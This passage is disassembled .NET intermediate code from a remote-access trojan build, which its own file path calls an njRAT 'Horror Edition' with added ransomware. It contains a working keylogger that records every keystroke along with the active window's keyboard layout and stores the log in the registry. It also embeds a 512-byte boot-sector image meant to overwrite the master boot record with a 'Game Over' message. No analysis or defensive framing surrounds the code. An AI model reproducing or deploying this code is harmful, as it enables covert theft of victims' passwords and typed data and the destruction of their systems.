      IL_000b:  newarr     [mscorlib]System.Byte
      IL_0010:  stloc.2
      IL_0011:  ldloc.2
      IL_0012:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0017:  brtrue.s   IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0088

      IL_0021:  ldarg.0
      IL_0022:  ldc.i4.0
      IL_0023:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0028:  stloc.3
      IL_0029:  ldc.i4.0
      IL_002a:  stloc.s    V_4
      IL_002c:  call       native int j.OK::GetForegroundWindow()
      IL_0031:  ldloca.s   V_4
      IL_0033:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0038:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_003d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_0042:  stloc.s    V_5
      IL_0044:  ldarg.0
      IL_0045:  ldloc.3
      IL_0046:  ldloc.2
      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.5
      IL_0049:  ldc.i4.0
      IL_004a:  ldloc.s    V_5
      IL_004c:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_0051:  pop
      IL_0052:  ldloc.1
      IL_0053:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0058:  stloc.0
      IL_0059:  leave.s    IL_0088

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005b:  dup
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0061:  stloc.s    V_6
      IL_0063:  ldloc.s    V_6
      IL_0065:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  ldarg.0
    IL_0077:  conv.ovf.i4.un
    IL_0078:  stloc.s    V_7
    IL_007a:  ldloca.s   V_7
    IL_007c:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0082:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0087:  stloc.0
    IL_0088:  ldloc.0
    IL_0089:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       286 (0x11e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                          object)
    IL_0011:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0016:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001b:  stfld      string j.kl::Logs
    .try
    {
      IL_0020:  ldc.i4.0
      IL_0021:  stloc.0
      IL_0022:  ldloc.0
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.0
      IL_0026:  ldc.i4.0
      IL_0027:  stloc.1
      IL_0028:  ldloc.1
      IL_0029:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_002e:  ldc.i4     0xffff8001
      IL_0033:  ceq
      IL_0035:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_003a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003f:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_0044:  ldc.i4.0
      IL_0045:  ceq
      IL_0047:  and
      IL_0048:  brfalse.s  IL_008d

      IL_004a:  ldloc.1
      IL_004b:  stloc.2
      IL_004c:  ldarg.0
      IL_004d:  ldloc.2
      IL_004e:  call       instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0053:  stloc.3
      IL_0054:  ldloc.3
      IL_0055:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005a:  ldc.i4.0
      IL_005b:  ble.s      IL_0086

      IL_005d:  ldarg.0
      IL_005e:  ldarg.0
      IL_005f:  ldfld      string j.kl::Logs
      IL_0064:  ldarg.0
      IL_0065:  call       instance string j.kl::AV()
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006f:  stfld      string j.kl::Logs
      IL_0074:  ldarg.0
      IL_0075:  ldarg.0
      IL_0076:  ldfld      string j.kl::Logs
      IL_007b:  ldloc.3
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldloc.2
      IL_0088:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_008d:  ldloc.1
      IL_008e:  ldc.i4.1
      IL_008f:  add.ovf
      IL_0090:  stloc.1
      IL_0091:  ldloc.1
      IL_0092:  ldc.i4     0xff
      IL_0097:  ble.s      IL_0028

      IL_0099:  ldloc.0
      IL_009a:  ldc.i4     0x3e8
      IL_009f:  bne.un.s   IL_00f7

      IL_00a1:  ldc.i4.0
      IL_00a2:  stloc.0
      IL_00a3:  ldstr      "[klen]"
      IL_00a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00ad:  ldc.i4     0x400
      IL_00b2:  mul.ovf
      IL_00b3:  stloc.s    V_4
      IL_00b5:  ldarg.0
      IL_00b6:  ldfld      string j.kl::Logs
      IL_00bb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00c0:  ldloc.s    V_4
      IL_00c2:  ble.s      IL_00e4

      IL_00c4:  ldarg.0
      IL_00c5:  ldarg.0
      IL_00c6:  ldfld      string j.kl::Logs
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldarg.0
      IL_00cd:  ldfld      string j.kl::Logs
      IL_00d2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d7:  ldloc.s    V_4
      IL_00d9:  sub.ovf
      IL_00da:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00df:  stfld      string j.kl::Logs
      IL_00e4:  ldarg.0
      IL_00e5:  ldfld      string j.kl::vn
      IL_00ea:  ldarg.0
      IL_00eb:  ldfld      string j.kl::Logs
      IL_00f0:  ldc.i4.1
      IL_00f1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f6:  pop
      IL_00f7:  ldc.i4.1
      IL_00f8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00fd:  br         IL_0022

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0102:  dup
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  stloc.s    V_5
      IL_010a:  ldloc.s    V_5
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011b:  leave.s    IL_011d

    }  // end handler
    IL_011d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ko()
    IL_0005:  ret
  } // end of method A::main

} // end of class j.A

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=6'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 6
  } // end of class '__StaticArrayInitTypeSize=6'

  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=512'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 512
  } // end of class '__StaticArrayInitTypeSize=512'

  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=6' '03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8' at I_0000EE6C
  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' '462E13B612D5A6C3EC8AB25DF69755AD20BF51EF' at I_0000EE74
  .method assembly static uint32  ComputeStringHash(string s) cil managed
  {
    // Code size       44 (0x2c)
    .maxstack  2
    .locals init (uint32 V_0,
             int32 V_1)
    IL_0000:  ldc.i4     0x811c9dc5
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  brfalse.s  IL_002a

    IL_0009:  ldc.i4.0
    IL_000a:  stloc.1
    IL_000b:  br.s       IL_0021

    IL_000d:  ldarg.0
    IL_000e:  ldloc.1
    IL_000f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0014:  ldloc.0
    IL_0015:  xor
    IL_0016:  ldc.i4     0x1000193
    IL_001b:  mul
    IL_001c:  stloc.0
    IL_001d:  ldloc.1
    IL_001e:  ldc.i4.1
    IL_001f:  add
    IL_0020:  stloc.1
    IL_0021:  ldloc.1
    IL_0022:  ldarg.0
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  blt.s      IL_000d

    IL_002a:  ldloc.0
    IL_002b:  ret
  } // end of method '<PrivateImplementationDetails>'::ComputeStringHash

} // end of class '<PrivateImplementationDetails>'


// =============================================================

.data cil I_0000EE6C = bytearray (
                 01 01 01 01 01 01) 
.data cil I_0000EE72 = int8[2]
.data cil I_0000EE74 = bytearray (
                 EB 00 31 C0 8E D8 FC B8 12 00 CD 10 BE 24 7C B3  // ..1..........$|.
                 04 E8 02 00 EB FE B7 00 AC 3C 00 74 06 B4 0E CD  // .........<.t....
                 10 EB F5 C3 41 73 20 79 6F 75 20 72 65 62 6F 6F  // ....As you reboo
                 74 2C 20 79 6F 75 20 66 69 6E 64 20 74 68 61 74  // t, you find that
                 20 79 6F 75 72 20 4D 42 52 20 68 61 73 20 62 65  //  your MBR has be
                 65 6E 20 6F 76 65 72 77 72 69 74 74 65 6E 2E 0D  // en overwritten..
                 0A 47 61 6D 65 20 4F 76 65 72 2E 00 00 00 00 00  // .Game Over......
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA) // ..............U.
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\HorrorRAT by TheGhost\NJRat 0.7d Horror Edition .::NEW::.\ass\vv\AddRansonware\tryaddnewplg - Copy - Copy\bin\Release\Stub.res
